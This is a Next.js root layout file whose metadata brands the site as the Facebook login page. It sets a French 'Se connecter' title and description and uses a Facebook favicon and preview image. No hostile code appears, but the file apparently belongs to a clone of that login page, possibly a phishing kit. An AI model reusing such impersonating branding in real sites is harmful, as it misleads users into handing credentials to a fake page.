import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata = {
  title: "Facebook - Se connecter",
  description: "Connectez-vous à Facebook pour rester en contact avec vos proches.",
  icons: {
    icon: "/facebook.png",
    shortcut: "/facebook.png",
    apple: "/facebook.png",
  },
  openGraph: {
    title: "Facebook - Se connecter",
    description: "Connectez-vous à Facebook pour rester en contact avec vos proches.",
    images: ["/facebook.png"],
  },
};

export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <body
        className={`${geistSans.variable} ${geistMono.variable} antialiased`}
      >
        {children}
      </body>
    </html>
  );
}
